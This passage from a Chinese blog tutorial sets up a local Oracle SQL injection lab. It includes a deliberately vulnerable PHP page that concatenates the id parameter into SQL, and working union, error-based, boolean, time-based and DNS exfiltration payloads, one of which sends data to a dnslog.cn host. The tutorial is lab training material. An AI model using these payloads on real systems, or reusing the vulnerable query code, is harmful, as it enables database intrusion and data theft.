--\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542575557-283cc745-e90e-4d49-a82d-4d9aa836531d.png#align=left&display=inline&height=295&margin=%5Bobject%2Object%5D&name=image.png&originHeight=590&originWidth=2062&size=88703&status=done&style=none&width=1031)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542587192-62e5df2a-2158-4204-8430-3f154aa27d6f.png#align=left&display=inline&height=402&margin=%5Bobject%2Object%5D&name=image.png&originHeight=804&originWidth=1650&size=109880&status=done&style=none&width=825)\n# 0x06 总结\nOracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。\n之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～\n","source":"_posts/Oracle数据库注入环境搭建.md","raw":"---\ntitle: Oracle数据库注入环境搭建\ntags: \n  - 数据库\n  - sql注入\n  - oracle数据库\n  - 环境搭建\ncategories: 环境搭建\nkeywords: 'oracle数据库,环境搭建,sql注入'\ndescription: Oracle数据库注入环境搭建\ncover: https://img0.baidu.com/it/u=3845303080,3279446310&fm=26&fmt=auto&gp=0.jpg\ndate: 2021-08-01 10:00:00\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 0x01 安装Oracle数据库\n\n1、首先下载数据库安装软件\n具体可以从参考这里，我是从他的百度云下载的\n[https://blog.csdn.net/qq_32786873/article/details/81187208](https://blog.csdn.net/qq_32786873/article/details/81187208)\n2、点击setup.exe安装即可\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627458559268-9d095175-6720-4b4b-9165-7cb60a3e855e.png#align=left&display=inline&height=252&margin=%5Bobject%2Object%5D&name=image.png&originHeight=504&originWidth=1570&size=61039&status=done&style=none&width=785)\n（安装过程不过多阐述，没什么太大区别，就下一步下一步即可）\n\n3、开启oracle数据库\n\n\n打开cmd，连接数据库\n```\nC:\\Users\\user>sqlplus\n请输入用户名:  system\n输入口令:\n连接到:\nOracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production\n```\n防止网络不通，建议关闭防火墙\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627453482798-3baff679-3b19-4f3c-a8c5-26dfa3fae74b.png#align=left&display=inline&height=401&margin=%5Bobject%2Object%5D&name=image.png&originHeight=802&originWidth=1310&size=91870&status=done&style=none&width=655)\n4、使用navicat连接数据库（system:root）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532220399-c06a2dc3-d502-4ac9-80bc-967625b716af.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=924&size=39243&status=done&style=none&width=462)\n5、也可以使用sql plus新建用户\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539624468-51a70f51-77bb-41a8-b3e6-598cd7784f7c.png#align=left&display=inline&height=623&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1246&originWidth=532&size=300224&status=done&style=none&width=266)\n# 0x02 安装phpstudy\n1、phpstudy下载地址如下：\n[http://public.xp.cn/upgrades/phpStudy20161103.zip](http://public.xp.cn/upgrades/phpStudy20161103.zip)\n这里推荐使用2016版本，因为我使用2018死活搭不成功\n安装过程很简单，设置安装路径，下一步下一步即可。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532525123-7fe22127-8c82-43e8-a3fc-3b90bdcb9888.png#align=left&display=inline&height=448&margin=%5Bobject%2Object%5D&name=image.png&originHeight=896&originWidth=1216&size=57968&status=done&style=none&width=608)\n2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532565418-c2f0a01f-ea23-4f42-aa37-4e4f223c25e9.png#align=left&display=inline&height=386&margin=%5Bobject%2Object%5D&name=image.png&originHeight=772&originWidth=1294&size=391925&status=done&style=none&width=647)\n（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：[https://www.php.cn/xiazai/download/1481](https://www.php.cn/xiazai/download/1481)）\n3、安装完之后，打开phpinfo\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532770453-b48b361b-6115-40e8-a802-86b3415379eb.png#align=left&display=inline&height=518&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1036&originWidth=1314&size=485815&status=done&style=none&width=657)\n也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为：\n```php\n<?php phpinfo();?>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532747143-dc367dc0-4a13-4e24-bbc7-7bd518e2e334.png#align=left&display=inline&height=364&margin=%5Bobject%2Object%5D&name=image.png&originHeight=728&originWidth=1360&size=164284&status=done&style=none&width=680)\n这里看到是32位的。\n# 0x03 设置oci8扩展\n（这里我是死活不成功，弄了半天）\n1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532987042-08f559fe-42a9-4dc3-a3c1-a1a88232b380.png#align=left&display=inline&height=476&margin=%5Bobject%2Object%5D&name=image.png&originHeight=952&originWidth=2644&size=213841&status=done&style=none&width=1322)\n2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：\n[https://www.it1352.com/1713162.html](https://www.it1352.com/1713162.html)\n在php路径下，打开cmd，输入如下命令：\n```php\nC:\\phpStudy\\php\\php-5.5.38>php.exe -m\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll' - %1 不是有 效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\nPHP Warning:  PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n\nWarning: PHP Startup: Unable to load dynamic library 'C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll' - %1 不是有效的 Win32 应用程序。\n in Unknown on line 0\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537664336-d0f1cbff-e217-415e-9c3f-c6afea1e1fff.png#align=left&display=inline&height=520&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1040&originWidth=1950&size=176001&status=done&style=none&width=975)\n3、根据文章中所说，安装**oracle instantclient**，链接如下：\n[https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html](https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html)\n因为数据库是11g的，所以安装11.1.x版本\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537791843-1b689f65-de26-4d29-b36f-e8269d9c9f08.png#align=left&display=inline&height=521&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1042&originWidth=2708&size=209242&status=done&style=none&width=1354)\n4、下载好之后解压，放入C:\\instantclient_11_1\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537838346-438837f0-196f-46f5-8263-80481facf640.png#align=left&display=inline&height=453&margin=%5Bobject%2Object%5D&name=image.png&originHeight=906&originWidth=1606&size=161187&status=done&style=none&width=803)\n5、设置环境变量，这一步很重要\n在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537919273-db8cc709-d63f-4f9b-8e73-3bb5f8e5ec67.png#align=left&display=inline&height=647&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1294&originWidth=2468&size=515243&status=done&style=none&width=1234)\n增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538045153-7b63740e-1dbf-4c66-bb39-3bd4c7092ff7.png#align=left&display=inline&height=511&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1022&originWidth=1046&size=77568&status=done&style=none&width=523)\n6、验证，在cmd命令提示符中输入\n```php\nwhere oci*\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539303726-33a0ea0d-eb8f-4dbe-a896-e17bcb58e6e5.png#align=left&display=inline&height=188&margin=%5Bobject%2Object%5D&name=image.png&originHeight=376&originWidth=1084&size=59269&status=done&style=none&width=542)\n出现instantclient的路径即可。\n7、重启计算机\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538340688-e470a2bb-38ed-4f82-88cb-9c554e1e534d.png#align=left&display=inline&height=355&margin=%5Bobject%2Object%5D&name=image.png&originHeight=710&originWidth=974&size=18334&status=done&style=none&width=487)\n8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可）\n```php\nphp.exe --ri oci8\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539378014-1dd2ed2a-e160-456c-95e8-8454296e760d.png#align=left&display=inline&height=481&margin=%5Bobject%2Object%5D&name=image.png&originHeight=962&originWidth=1340&size=113244&status=done&style=none&width=670)\n9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539512949-f85db2c3-85b5-4da6-a1c4-3ad15f45dc16.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1580&size=78200&status=done&style=none&width=790)\n当出现如下界面，环境就已经基本搭建好了。\n# 0x04 创建漏洞测试环境\n## 1、 建立存在漏洞数据\n1、首先使用navicat连接数据库\n（这里有一个坑，连接时可能会出现oracle library is not loaded）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539961158-a91d2a49-c1a1-402d-a3a8-3b8a5cbb8620.png#align=left&display=inline&height=397&margin=%5Bobject%2Object%5D&name=image.png&originHeight=794&originWidth=1872&size=67558&status=done&style=none&width=936)\n在工具 - 选项处\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539811909-3ea4f232-baa8-491d-8de3-08a44e87ac54.png#align=left&display=inline&height=282&margin=%5Bobject%2Object%5D&name=image.png&originHeight=564&originWidth=1320&size=68308&status=done&style=none&width=660)\n修改oci环境，选择之前数据库安装的路径，修改完后记得重启\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540060849-0839d8a1-10c0-4b49-ba35-cd70e3a7c14b.png#align=left&display=inline&height=597&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1194&originWidth=1536&size=79187&status=done&style=none&width=768)\n2、连接数据库之后，选择相应的用户，我这里是SYSTEM\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540125339-60483bd9-5527-46c5-9fc2-b2394ddd0722.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=946&size=30183&status=done&style=none&width=473)\n3、新建表TEST，设置如下字段\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540264141-c9cb7b96-558b-4cef-b015-5c25e97bd8d7.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1628&size=58227&status=done&style=none&width=814)\n4、添加如下数据（数据其实是任意的，随意添加即可）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540925893-509b0585-e42c-437f-a8cf-6d178dd23d4b.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&name=image.png&originHeight=470&originWidth=1358&size=43179&status=done&style=none&width=679)\n5、新建查询进行验证\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540945678-0b57f457-592c-4efd-aa13-a5ca5033ea8f.png#align=left&display=inline&height=457&margin=%5Bobject%2Object%5D&name=image.png&originHeight=914&originWidth=1530&size=59045&status=done&style=none&width=765)\n以上漏洞数据就简单搭建成功了。\n## 2、搭建PHP站点\n1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下\n源码如下：\n```php\n<?php\n  header(\"Content-Type:text/html;charset=utf-8\");\n  $id = @$_GET['id'];\n  $dbstr =\"(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))\"; //连接数据库的参数配置 \n  $conn = oci_connect('system','root',$dbstr);//连接数据库，前两个参数分别是账号和密码\n  if (!$conn)\n  {\n    $Error = oci_error();//错误信息\n    print htmlentities($Error['message']);\n    exit;\n  }\n  else\n  {\n    echo \"<h3>Oracle 注入测试靶场</h3>\".\"<br>\";\n    $sql = \"select * from TEST where id=\".$id;//sql查询语句\n\t  echo \"当前sql语句为：\".$sql.\"<br>\".\"<br>\";//输出sql查询语句\n    $ora_b = oci_parse($conn,$sql);  //编译sql语句 \n    oci_execute($ora_b,OCI_DEFAULT);  //执行 \n    while($r=oci_fetch_row($ora_b))  //取回结果 \n    { \n      $i=0;\n      echo \"Id:\".$r[$i++].\"  </t> <br>\";\n      echo \"Name:\".$r[$i++].\"  </t><br>  \";\n      echo \"Age:\".$r[$i++].\"  </t><br>  \";\n    }\n  }\n  oci_close($conn);//关闭连接\n?>\n```\n2、访问[http://localhost/oracle.php?id=1](http://localhost/oracle.php?id=1)，返回如下界面表示搭建成功，数据库也成功连接了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541521049-4e04787c-15b8-4686-a485-d5d2e03e9f3f.png#align=left&display=inline&height=340&margin=%5Bobject%2Object%5D&name=image.png&originHeight=680&originWidth=1342&size=55565&status=done&style=none&width=671)\n# 0x05 Oracle注入测试\n## 1、检测漏洞点\n```php\nhttp://localhost/oracle.php?id=1 and 1=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541538885-aab0d8c4-aafa-4511-897d-ab85f13130e2.png#align=left&display=inline&height=261&margin=%5Bobject%2Object%5D&name=image.png&originHeight=522&originWidth=1176&size=46725&status=done&style=none&width=588)\n```php\nhttp://localhost/oracle.php?id=1 and 1=2\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541558550-37db5cd6-20ef-4b68-a731-38eca533e8fb.png#align=left&display=inline&height=222&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=1072&size=38860&status=done&style=none&width=536)\n## 2、显错注入\n```php\nhttp://localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,'4' from dual --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541979564-ea8c20f1-051d-4998-ae63-8cc4c6caf50e.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1874&size=73845&status=done&style=none&width=937)\n## 3、报错注入\n```php\nhttp://localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542108099-2a4e87d2-214a-4809-9762-24e01b40471b.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2068&size=150069&status=done&style=none&width=1034)\n## 4、布尔盲注\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542211017-7bbd5646-d87a-496e-abef-d67b929449ac.png#align=left&display=inline&height=348&margin=%5Bobject%2Object%5D&name=image.png&originHeight=696&originWidth=1774&size=76159&status=done&style=none&width=887)\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(user,'SSSSS',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542229391-54e9c196-437c-464a-a1ee-565b21ccee2b.png#align=left&display=inline&height=174&margin=%5Bobject%2Object%5D&name=image.png&originHeight=574&originWidth=1752&size=66181&status=done&style=none&width=532)\n## 5、延时盲注\n```php\nhttp://localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542453679-5c200dec-7af1-485d-91a1-5230c4724937.png#align=left&display=inline&height=424&margin=%5Bobject%2Object%5D&name=image.png&originHeight=848&originWidth=2060&size=180765&status=done&style=none&width=1030)\n## 6、外带数据\n```php\nhttp://localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.pgx519.dnslog.cn') from dual)is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542575557-283cc745-e90e-4d49-a82d-4d9aa836531d.png#align=left&display=inline&height=295&margin=%5Bobject%2Object%5D&name=image.png&originHeight=590&originWidth=2062&size=88703&status=done&style=none&width=1031)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542587192-62e5df2a-2158-4204-8430-3f154aa27d6f.png#align=left&display=inline&height=402&margin=%5Bobject%2Object%5D&name=image.png&originHeight=804&originWidth=1650&size=109880&status=done&style=none&width=825)\n# 0x06 总结\nOracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。\n之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～\n","slug":"Oracle数据库注入环境搭建","published":1,"updated":"2021-08-07T16:15:29.903Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgj0057vkq38qztbe5m","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"0x01-安装Oracle数据库\"><a href=\"#0x01-安装Oracle数据库\" class=\"headerlink\" title=\"0x01 安装Oracle数据库\"></a>0x01 安装Oracle数据库</h1><p>1、首先下载数据库安装软件<br>具体可以从参考这里，我是从他的百度云下载的<br><a href=\"https://blog.csdn.net/qq_32786873/article/details/81187208\">https://blog.csdn.net/qq_32786873/article/details/81187208</a><br>2、点击setup.exe安装即可<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627458559268-9d095175-6720-4b4b-9165-7cb60a3e855e.png#align=left&display=inline&height=252&margin=%5Bobject%2Object%5D&name=image.png&originHeight=504&originWidth=1570&size=61039&status=done&style=none&width=785\" alt=\"image.png\"><br>（安装过程不过多阐述，没什么太大区别，就下一步下一步即可）</p>\n<p>3、开启oracle数据库</p>\n<p>打开cmd，连接数据库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\user&gt;sqlplus</span><br><span class=\"line\">请输入用户名:  system</span><br><span class=\"line\">输入口令:</span><br><span class=\"line\">连接到:</span><br><span class=\"line\">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br></pre></td></tr></table></figure>\n<p>防止网络不通，建议关闭防火墙<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627453482798-3baff679-3b19-4f3c-a8c5-26dfa3fae74b.png#align=left&display=inline&height=401&margin=%5Bobject%2Object%5D&name=image.png&originHeight=802&originWidth=1310&size=91870&status=done&style=none&width=655\" alt=\"image.png\"><br>4、使用navicat连接数据库（system:root）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532220399-c06a2dc3-d502-4ac9-80bc-967625b716af.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=924&size=39243&status=done&style=none&width=462\" alt=\"image.png\"><br>5、也可以使用sql plus新建用户<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539624468-51a70f51-77bb-41a8-b3e6-598cd7784f7c.png#align=left&display=inline&height=623&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1246&originWidth=532&size=300224&status=done&style=none&width=266\" alt=\"image.png\"></p>\n<h1 id=\"0x02-安装phpstudy\"><a href=\"#0x02-安装phpstudy\" class=\"headerlink\" title=\"0x02 安装phpstudy\"></a>0x02 安装phpstudy</h1><p>1、phpstudy下载地址如下：<br><a href=\"http://public.xp.cn/upgrades/phpStudy20161103.zip\">http://public.xp.cn/upgrades/phpStudy20161103.zip</a><br>这里推荐使用2016版本，因为我使用2018死活搭不成功<br>安装过程很简单，设置安装路径，下一步下一步即可。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532525123-7fe22127-8c82-43e8-a3fc-3b90bdcb9888.png#align=left&display=inline&height=448&margin=%5Bobject%2Object%5D&name=image.png&originHeight=896&originWidth=1216&size=57968&status=done&style=none&width=608\" alt=\"image.png\"><br>2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532565418-c2f0a01f-ea23-4f42-aa37-4e4f223c25e9.png#align=left&display=inline&height=386&margin=%5Bobject%2Object%5D&name=image.png&originHeight=772&originWidth=1294&size=391925&status=done&style=none&width=647\" alt=\"image.png\"><br>（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：<a href=\"https://www.php.cn/xiazai/download/1481\">https://www.php.cn/xiazai/download/1481</a>）<br>3、安装完之后，打开phpinfo<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532770453-b48b361b-6115-40e8-a802-86b3415379eb.png#align=left&display=inline&height=518&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1036&originWidth=1314&size=485815&status=done&style=none&width=657\" alt=\"image.png\"><br>也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> phpinfo();<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532747143-dc367dc0-4a13-4e24-bbc7-7bd518e2e334.png#align=left&display=inline&height=364&margin=%5Bobject%2Object%5D&name=image.png&originHeight=728&originWidth=1360&size=164284&status=done&style=none&width=680\" alt=\"image.png\"><br>这里看到是32位的。</p>\n<h1 id=\"0x03-设置oci8扩展\"><a href=\"#0x03-设置oci8扩展\" class=\"headerlink\" title=\"0x03 设置oci8扩展\"></a>0x03 设置oci8扩展</h1><p>（这里我是死活不成功，弄了半天）<br>1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627532987042-08f559fe-42a9-4dc3-a3c1-a1a88232b380.png#align=left&display=inline&height=476&margin=%5Bobject%2Object%5D&name=image.png&originHeight=952&originWidth=2644&size=213841&status=done&style=none&width=1322\" alt=\"image.png\"><br>2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：<br><a href=\"https://www.it1352.com/1713162.html\">https://www.it1352.com/1713162.html</a><br>在php路径下，打开cmd，输入如下命令：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\phpStudy\\php\\php-<span class=\"number\">5.5</span>.<span class=\"number\">38</span>&gt;php.exe -m</span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有 效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\">PHP Warning:  PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">Warning: PHP Startup: Unable to load dynamic library <span class=\"string\">&#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27;</span> - %<span class=\"number\">1</span> 不是有效的 Win32 应用程序。</span><br><span class=\"line\"> in Unknown on line <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537664336-d0f1cbff-e217-415e-9c3f-c6afea1e1fff.png#align=left&display=inline&height=520&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1040&originWidth=1950&size=176001&status=done&style=none&width=975\" alt=\"image.png\"><br>3、根据文章中所说，安装<strong>oracle instantclient</strong>，链接如下：<br><a href=\"https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html\">https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html</a><br>因为数据库是11g的，所以安装11.1.x版本<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537791843-1b689f65-de26-4d29-b36f-e8269d9c9f08.png#align=left&display=inline&height=521&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1042&originWidth=2708&size=209242&status=done&style=none&width=1354\" alt=\"image.png\"><br>4、下载好之后解压，放入C:\\instantclient_11_1<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537838346-438837f0-196f-46f5-8263-80481facf640.png#align=left&display=inline&height=453&margin=%5Bobject%2Object%5D&name=image.png&originHeight=906&originWidth=1606&size=161187&status=done&style=none&width=803\" alt=\"image.png\"><br>5、设置环境变量，这一步很重要<br>在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627537919273-db8cc709-d63f-4f9b-8e73-3bb5f8e5ec67.png#align=left&display=inline&height=647&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1294&originWidth=2468&size=515243&status=done&style=none&width=1234\" alt=\"image.png\"><br>增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538045153-7b63740e-1dbf-4c66-bb39-3bd4c7092ff7.png#align=left&display=inline&height=511&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1022&originWidth=1046&size=77568&status=done&style=none&width=523\" alt=\"image.png\"><br>6、验证，在cmd命令提示符中输入</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">where oci*</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539303726-33a0ea0d-eb8f-4dbe-a896-e17bcb58e6e5.png#align=left&display=inline&height=188&margin=%5Bobject%2Object%5D&name=image.png&originHeight=376&originWidth=1084&size=59269&status=done&style=none&width=542\" alt=\"image.png\"><br>出现instantclient的路径即可。<br>7、重启计算机<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627538340688-e470a2bb-38ed-4f82-88cb-9c554e1e534d.png#align=left&display=inline&height=355&margin=%5Bobject%2Object%5D&name=image.png&originHeight=710&originWidth=974&size=18334&status=done&style=none&width=487\" alt=\"image.png\"><br>8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td 